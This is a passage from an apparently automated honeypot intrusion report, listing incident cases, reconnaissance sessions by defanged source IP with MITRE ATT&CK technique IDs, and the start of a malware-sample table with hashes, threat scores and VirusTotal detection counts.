| IR-36330ac4fb85 | HIGH | `92.118.39[.]14` | 2026-10-28 02:54 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-94ad0132a5a9 | HIGH | `92.118.39[.]14` | 2026-10-28 02:56 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9c491a11247c | HIGH | `92.118.39[.]14` | 2026-10-28 02:58 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-8f4e5ce2963d | HIGH | `92.118.39[.]14` | 2026-10-28 03:00 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-6f9338b4742a | HIGH | `110.83.220[.]198` | 2026-10-28 03:03 | Y | 1 | 0 | `T1078 · T1592` |
| IR-11e5d147b699 | HIGH | `92.118.39[.]14` | 2026-10-28 03:03 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-b90b400cb342 | HIGH | `92.118.39[.]14` | 2026-10-28 03:05 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-efc0b4275115 | HIGH | `92.118.39[.]14` | 2026-10-28 03:07 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-1dd463d24f22 | HIGH | `92.118.39[.]14` | 2026-10-28 03:12 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-05eb1d566c69 | HIGH | `92.118.39[.]14` | 2026-10-28 03:14 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-4bac68906cda | HIGH | `92.118.39[.]14` | 2026-10-28 03:16 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-b918587da30f | HIGH | `92.118.39[.]14` | 2026-10-28 03:18 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-07753894f33d | HIGH | `92.118.39[.]14` | 2026-10-28 03:20 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-99e229c7aef0 | HIGH | `222.110.147[.]58` | 2026-10-28 03:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-42e96bd30bb2 | HIGH | `222.110.147[.]58` | 2026-10-28 03:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-522a723ad862 | HIGH | `192.210.169[.]170` | 2026-10-28 03:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-11444c84b21b | HIGH | `192.210.169[.]170` | 2026-10-28 03:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ee44317741c0 | HIGH | `92.118.39[.]14` | 2026-10-28 03:22 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-49f3b3c8e177 | HIGH | `92.30.245[.]181` | 2026-10-28 03:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c6506de8a2c2 | HIGH | `92.30.245[.]181` | 2026-10-28 03:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-709f776a0256 | HIGH | `92.118.39[.]14` | 2026-10-28 03:24 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-97ea3bfe6a7f | HIGH | `92.118.39[.]14` | 2026-10-28 03:26 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-ecfc6de52562 | HIGH | `40.112.183[.]29` | 2026-10-28 03:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-63166bd4ca47 | HIGH | `40.112.183[.]29` | 2026-10-28 03:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5f2a1118a5fd | HIGH | `92.118.39[.]14` | 2026-10-28 03:29 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-756ebc132beb | HIGH | `92.118.39[.]14` | 2026-10-28 03:31 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-82d1b7e39fbc | HIGH | `179.51.153[.]37` | 2026-10-28 03:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9b14805f7c93 | HIGH | `179.51.153[.]37` | 2026-10-28 03:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9375b33889db | HIGH | `92.118.39[.]14` | 2026-10-28 03:33 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-cfd8d15984d9 | HIGH | `138.226.239[.]233` | 2026-10-28 03:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f99907fcce49 | HIGH | `92.118.39[.]14` | 2026-10-28 03:35 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-26bed607ef63 | HIGH | `92.118.39[.]14` | 2026-10-28 03:37 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-414726647cda | HIGH | `92.118.39[.]14` | 2026-10-28 03:39 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-cc28bb89d6d0 | HIGH | `92.118.39[.]14` | 2026-10-28 03:41 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-7f3dfbcf2dbe | HIGH | `92.118.39[.]14` | 2026-10-28 03:43 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-22438bfce620 | HIGH | `92.118.39[.]14` | 2026-10-28 03:45 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-244df0c07fa8 | HIGH | `36.92.140[.]209` | 2026-10-28 03:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ff1b0d9a3368 | HIGH | `36.92.140[.]209` | 2026-10-28 03:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ed41722484c4 | HIGH | `103.207.9[.]246` | 2026-10-28 03:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4727dccfb0c3 | HIGH | `103.207.9[.]246` | 2026-10-28 03:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d05ff12d2be1 | HIGH | `103.255.200[.]90` | 2026-10-28 03:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9b9319aa7481 | HIGH | `103.255.200[.]90` | 2026-10-28 03:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aaffe38f3044 | HIGH | `92.118.39[.]14` | 2026-10-28 03:48 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e5c8e071beb7 | HIGH | `77.90.185[.]17` | 2026-10-28 04:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-80ec0b43db66 | HIGH | `109.160.32[.]173` | 2026-10-28 04:09 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c3acf36d4bb8 | HIGH | `138.226.239[.]234` | 2026-10-28 04:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b501ca312474 | HIGH | `88.147.30[.]59` | 2026-10-28 04:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 346 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.169[.]96` | **4** | 2026-10-28 04:59 | 2026-10-28 10:02 | 4m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **4** | 2026-10-28 03:12 | 2026-10-28 08:16 | 4m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **3** | 2026-10-28 13:27 | 2026-10-28 16:46 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-28 01:00 | 2026-10-28 04:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-28 06:25 | 2026-10-28 10:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-28 12:23 | 2026-10-28 16:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]151` | **2** | 2026-10-28 09:55 | 2026-10-28 10:42 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-10-28 00:55 | 2026-10-28 02:13 | 2m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-10-28 12:34 | 2026-10-28 14:33 | 2m | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | **2** | 2026-10-28 09:01 | 2026-10-28 10:48 | 2m | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | **2** | 2026-10-28 01:42 | 2026-10-28 02:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | **2** | 2026-10-28 07:43 | 2026-10-28 08:16 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.11[.]137` | 1 | 2026-10-28 13:54 | 2026-10-28 13:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.141[.]163` | 1 | 2026-10-28 08:18 | 2026-10-28 08:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.36.125[.]211` | 1 | 2026-10-28 06:47 | 2026-10-28 06:47 | 15s | 0 | `T1592` | 🟢 LOW |
| `101.96.202[.]177` | 1 | 2026-10-28 11:37 | 2026-10-28 11:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `102.216.219[.]24` | 1 | 2026-10-28 14:15 | 2026-10-28 14:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-10-28 07:32 | 2026-10-28 07:33 | 5s | 0 | `T1592` | 🟢 LOW |
| `106.227.75[.]197` | 1 | 2026-10-28 10:03 | 2026-10-28 10:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.75.153[.]103` | 1 | 2026-10-28 10:13 | 2026-10-28 10:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]159` | 1 | 2026-10-28 08:08 | 2026-10-28 08:08 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]173` | 1 | 2026-10-28 04:08 | 2026-10-28 04:08 | 8s | 0 | `T1592` | 🟢 LOW |
| `110.83.220[.]198` | 1 | 2026-10-28 03:03 | 2026-10-28 03:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.228.14[.]97` | 1 | 2026-10-28 02:09 | 2026-10-28 02:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.219.157[.]97` | 1 | 2026-10-28 07:03 | 2026-10-28 07:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.219.157[.]97` | 1 | 2026-10-28 09:27 | 2026-10-28 09:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.66.37[.]74` | 1 | 2026-10-28 10:16 | 2026-10-28 10:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.67.232[.]93` | 1 | 2026-10-28 16:54 | 2026-10-28 16:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.190.149[.]134` | 1 | 2026-10-28 07:42 | 2026-10-28 07:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.181[.]18` | 1 | 2026-10-28 06:11 | 2026-10-28 06:13 | 86s | 0 | `T1592` | 🟢 LOW |
| `115.190.211[.]57` | 1 | 2026-10-28 04:40 | 2026-10-28 04:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.229[.]67` | 1 | 2026-10-28 11:52 | 2026-10-28 11:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.234[.]63` | 1 | 2026-10-28 08:11 | 2026-10-28 08:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.249[.]177` | 1 | 2026-10-28 16:53 | 2026-10-28 16:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.227.26[.]40` | 1 | 2026-10-28 11:39 | 2026-10-28 11:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.62.22[.]127` | 1 | 2026-10-28 11:12 | 2026-10-28 11:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.111[.]55` | 1 | 2026-10-28 10:28 | 2026-10-28 10:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.47.77[.]183` | 1 | 2026-10-28 07:00 | 2026-10-28 07:00 | 15s | 0 | `T1592` | 🟢 LOW |
| `119.192.187[.]103` | 1 | 2026-10-28 10:53 | 2026-10-28 10:54 | 23s | 0 | `T1592` | 🟢 LOW |
| `120.27.141[.]87` | 1 | 2026-10-28 08:12 | 2026-10-28 08:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.28.189[.]248` | 1 | 2026-10-28 01:01 | 2026-10-28 01:02 | 12s | 0 | `T1592` | 🟢 LOW |
| `120.48.111[.]71` | 1 | 2026-10-28 09:25 | 2026-10-28 09:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.44[.]127` | 1 | 2026-10-28 07:10 | 2026-10-28 07:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.130.11[.]124` | 1 | 2026-10-28 15:55 | 2026-10-28 15:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.190.190[.]237` | 1 | 2026-10-28 04:53 | 2026-10-28 04:53 | 14s | 0 | `T1592` | 🟢 LOW |
| `122.114.69[.]235` | 1 | 2026-10-28 02:50 | 2026-10-28 02:51 | 56s | 0 | `T1592` | 🟢 LOW |
| `122.188.208[.]21` | 1 | 2026-10-28 11:12 | 2026-10-28 11:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.245.67[.]213` | 1 | 2026-10-28 04:39 | 2026-10-28 04:39 | 13s | 0 | `T1592` | 🟢 LOW |
| `13.218.153[.]179` | 1 | 2026-10-28 01:30 | 2026-10-28 01:30 | 2s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-10-28 16:40 | 2026-10-28 16:41 | 42s | 0 | `T1592` | 🟢 LOW |
| `139.198.29[.]172` | 1 | 2026-10-28 16:48 | 2026-10-28 16:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]86` | 1 | 2026-10-28 11:42 | 2026-10-28 11:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]198` | 1 | 2026-10-28 01:58 | 2026-10-28 02:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]61` | 1 | 2026-10-28 08:24 | 2026-10-28 08:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.83[.]214` | 1 | 2026-10-28 10:05 | 2026-10-28 10:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `140.246.108[.]106` | 1 | 2026-10-28 09:32 | 2026-10-28 09:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-28 08:54 | 2026-10-28 08:55 | 52s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-28 10:57 | 2026-10-28 10:58 | 65s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-28 13:53 | 2026-10-28 13:53 | 42s | 0 | `T1592` | 🟢 LOW |
| `152.32.243[.]98` | 1 | 2026-10-28 04:57 | 2026-10-28 04:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `16.5.0[.]176` | 1 | 2026-10-28 01:32 | 2026-10-28 01:32 | 3s | 0 | `T1592` | 🟢 LOW |
| `16.5.0[.]177` | 1 | 2026-10-28 01:32 | 2026-10-28 01:32 | 4s | 0 | `T1592` | 🟢 LOW |
| `16.5.0[.]222` | 1 | 2026-10-28 06:03 | 2026-10-28 06:03 | 4s | 0 | `T1592` | 🟢 LOW |
| `16.5.0[.]223` | 1 | 2026-10-28 06:03 | 2026-10-28 06:03 | 3s | 0 | `T1592` | 🟢 LOW |
| `160.2.214[.]11` | 1 | 2026-10-28 10:00 | 2026-10-28 10:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `161.81.179[.]18` | 1 | 2026-10-28 15:26 | 2026-10-28 15:27 | 13s | 0 | `T1592` | 🟢 LOW |
| `165.165.118[.]193` | 1 | 2026-10-28 07:31 | 2026-10-28 07:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.81.154[.]176` | 1 | 2026-10-28 02:00 | 2026-10-28 02:00 | 12s | 0 | `T1592` | 🟢 LOW |
| `171.114.224[.]189` | 1 | 2026-10-28 03:58 | 2026-10-28 03:59 | 13s | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]12` | 1 | 2026-10-28 01:08 | 2026-10-28 01:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.239[.]55` | 1 | 2026-10-28 08:48 | 2026-10-28 08:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-10-28 16:31 | 2026-10-28 16:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-10-28 00:56 | 2026-10-28 00:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-10-28 10:00 | 2026-10-28 10:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.173.122[.]111` | 1 | 2026-10-28 06:25 | 2026-10-28 06:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.114[.]151` | 1 | 2026-10-28 13:07 | 2026-10-28 13:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.188[.]229` | 1 | 2026-10-28 06:02 | 2026-10-28 06:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.220.176[.]117` | 1 | 2026-10-28 10:10 | 2026-10-28 10:10 | 12s | 0 | `T1592` | 🟢 LOW |
| `181.230.58[.]185` | 1 | 2026-10-28 12:28 | 2026-10-28 12:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.89.48[.]174` | 1 | 2026-10-28 06:50 | 2026-10-28 06:50 | 13s | 0 | `T1592` | 🟢 LOW |
| `182.253.205[.]236` | 1 | 2026-10-28 10:10 | 2026-10-28 10:11 | 26s | 0 | `T1592` | 🟢 LOW |
| `182.42.93[.]139` | 1 | 2026-10-28 09:37 | 2026-10-28 09:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.201.208[.]25` | 1 | 2026-10-28 03:20 | 2026-10-28 03:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.232.212[.]207` | 1 | 2026-10-28 07:12 | 2026-10-28 07:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.251.230[.]98` | 1 | 2026-10-28 06:21 | 2026-10-28 06:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `184.105.139[.]70` | 1 | 2026-10-28 04:00 | 2026-10-28 04:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `187.103.1[.]3` | 1 | 2026-10-28 02:38 | 2026-10-28 02:38 | 12s | 0 | `T1592` | 🟢 LOW |
| `190.215.240[.]33` | 1 | 2026-10-28 12:04 | 2026-10-28 12:04 | 12s | 0 | `T1592` | 🟢 LOW |
| `191.101.96[.]217` | 1 | 2026-10-28 04:44 | 2026-10-28 04:45 | 27s | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]220` | 1 | 2026-10-28 01:43 | 2026-10-28 01:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-28 06:39 | 2026-10-28 06:39 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-28 15:55 | 2026-10-28 15:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-10-28 04:06 | 2026-10-28 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.65.171[.]36` | 1 | 2026-10-28 12:38 | 2026-10-28 12:38 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.65.202[.]146` | 1 | 2026-10-28 07:50 | 2026-10-28 07:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.59.89[.]234` | 1 | 2026-10-28 04:05 | 2026-10-28 04:05 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.71.67[.]237` | 1 | 2026-10-28 04:25 | 2026-10-28 04:25 | 13s | 0 | `T1592` | 🟢 LOW |
| `202.103.157[.]115` | 1 | 2026-10-28 15:00 | 2026-10-28 15:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `210.208.104[.]219` | 1 | 2026-10-28 10:04 | 2026-10-28 10:04 | 22s | 0 | `T1592` | 🟢 LOW |
| `210.91.153[.]182` | 1 | 2026-10-28 06:47 | 2026-10-28 06:47 | 30s | 0 | `T1592` | 🟢 LOW |
| `211.225.18[.]106` | 1 | 2026-10-28 14:06 | 2026-10-28 14:06 | 22s | 0 | `T1592` | 🟢 LOW |
| `211.51.137[.]166` | 1 | 2026-10-28 07:00 | 2026-10-28 07:00 | 17s | 0 | `T1592` | 🟢 LOW |
| `213.37.21[.]112` | 1 | 2026-10-28 03:34 | 2026-10-28 03:34 | 13s | 0 | `T1592` | 🟢 LOW |
| `213.37.21[.]112` | 1 | 2026-10-28 14:58 | 2026-10-28 14:58 | 13s | 0 | `T1592` | 🟢 LOW |
| `218.158.227[.]211` | 1 | 2026-10-28 03:09 | 2026-10-28 03:10 | 23s | 0 | `T1592` | 🟢 LOW |
| `220.77.86[.]237` | 1 | 2026-10-28 09:55 | 2026-10-28 09:55 | 29s | 0 | `T1592` | 🟢 LOW |
| `24.72.29[.]49` | 1 | 2026-10-28 14:10 | 2026-10-28 14:10 | 18s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-10-28 10:11 | 2026-10-28 10:11 | 9s | 0 | `T1592` | 🟢 LOW |
| `34.156.1[.]74` | 1 | 2026-10-28 05:23 | 2026-10-28 05:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.52.205[.]46` | 1 | 2026-10-28 04:20 | 2026-10-28 04:20 | 9s | 0 | `T1592` | 🟢 LOW |
| `35.195.80[.]224` | 1 | 2026-10-28 04:45 | 2026-10-28 04:45 | 4s | 0 | `T1592` | 🟢 LOW |
| `35.233.102[.]240` | 1 | 2026-10-28 05:22 | 2026-10-28 05:22 | 3s | 0 | `T1592` | 🟢 LOW |
| `36.103.243[.]179` | 1 | 2026-10-28 11:19 | 2026-10-28 11:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.104.144[.]114` | 1 | 2026-10-28 02:46 | 2026-10-28 02:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.107.225[.]185` | 1 | 2026-10-28 04:23 | 2026-10-28 04:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.133.45[.]189` | 1 | 2026-10-28 04:35 | 2026-10-28 04:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `37.22.86[.]230` | 1 | 2026-10-28 11:50 | 2026-10-28 11:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `37.54.35[.]108` | 1 | 2026-10-28 09:24 | 2026-10-28 09:24 | 14s | 0 | `T1592` | 🟢 LOW |
| `40.124.179[.]252` | 1 | 2026-10-28 11:09 | 2026-10-28 11:10 | 9s | 0 | `T1592` | 🟢 LOW |
| `42.51.40[.]51` | 1 | 2026-10-28 04:42 | 2026-10-28 04:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.224.66[.]204` | 1 | 2026-10-28 15:37 | 2026-10-28 15:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]121` | 1 | 2026-10-28 13:06 | 2026-10-28 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-28 07:03 | 2026-10-28 07:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-28 16:03 | 2026-10-28 16:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.165.164[.]238` | 1 | 2026-10-28 10:32 | 2026-10-28 10:33 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.79.172[.]21` | 1 | 2026-10-28 09:36 | 2026-10-28 09:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.20.236[.]52` | 1 | 2026-10-28 10:24 | 2026-10-28 10:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.36.78[.]66` | 1 | 2026-10-28 10:08 | 2026-10-28 10:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.151.249[.]194` | 1 | 2026-10-28 07:39 | 2026-10-28 07:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.16.41[.]154` | 1 | 2026-10-28 11:20 | 2026-10-28 11:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]5` | 1 | 2026-10-28 04:26 | 2026-10-28 04:26 | 4s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]192` | 1 | 2026-10-28 06:35 | 2026-10-28 06:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]117` | 1 | 2026-10-28 07:41 | 2026-10-28 07:41 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]133` | 1 | 2026-10-28 07:45 | 2026-10-28 07:45 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]217` | 1 | 2026-10-28 08:40 | 2026-10-28 08:40 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]33` | 1 | 2026-10-28 08:37 | 2026-10-28 08:37 | 5s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]39` | 1 | 2026-10-28 05:38 | 2026-10-28 05:39 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]118` | 1 | 2026-10-28 05:40 | 2026-10-28 05:40 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]43` | 1 | 2026-10-28 07:44 | 2026-10-28 07:44 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]45` | 1 | 2026-10-28 13:34 | 2026-10-28 13:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]66` | 1 | 2026-10-28 05:39 | 2026-10-28 05:39 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]229` | 1 | 2026-10-28 07:45 | 2026-10-28 07:45 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]235` | 1 | 2026-10-28 08:37 | 2026-10-28 08:37 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.240.219[.]146` | 1 | 2026-10-28 15:19 | 2026-10-28 15:19 | 2s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]186` | 1 | 2026-10-28 12:38 | 2026-10-28 12:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.70.251[.]77` | 1 | 2026-10-28 05:42 | 2026-10-28 05:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `73.156.221[.]230` | 1 | 2026-10-28 06:14 | 2026-10-28 06:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-28 08:15 | 2026-10-28 08:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-28 11:58 | 2026-10-28 11:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-10-28 08:45 | 2026-10-28 08:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.43.159[.]7` | 1 | 2026-10-28 09:39 | 2026-10-28 09:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.117.197[.]254` | 1 | 2026-10-28 15:16 | 2026-10-28 15:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.61.233[.]13` | 1 | 2026-10-28 07:32 | 2026-10-28 07:33 | 16s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-10-28 04:58 | 2026-10-28 04:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.172.76[.]198` | 1 | 2026-10-28 10:04 | 2026-10-28 10:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `84.54.71[.]3` | 1 | 2026-10-28 12:56 | 2026-10-28 12:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]41` | 1 | 2026-10-28 08:30 | 2026-10-28 08:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]71` | 1 | 2026-10-28 08:33 | 2026-10-28 08:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.252.48[.]165` | 1 | 2026-10-28 09:29 | 2026-10-28 09:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.70.1[.]146` | 1 | 2026-10-28 14:03 | 2026-10-28 14:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.122.53[.]183` | 1 | 2026-10-28 02:03 | 2026-10-28 02:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-10-28 02:24 | 2026-10-28 02:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `97.99.8[.]23` | 1 | 2026-10-28 09:11 | 2026-10-28 09:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `98.248.39[.]5` | 1 | 2026-10-28 02:36 | 2026-10-28 02:36 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
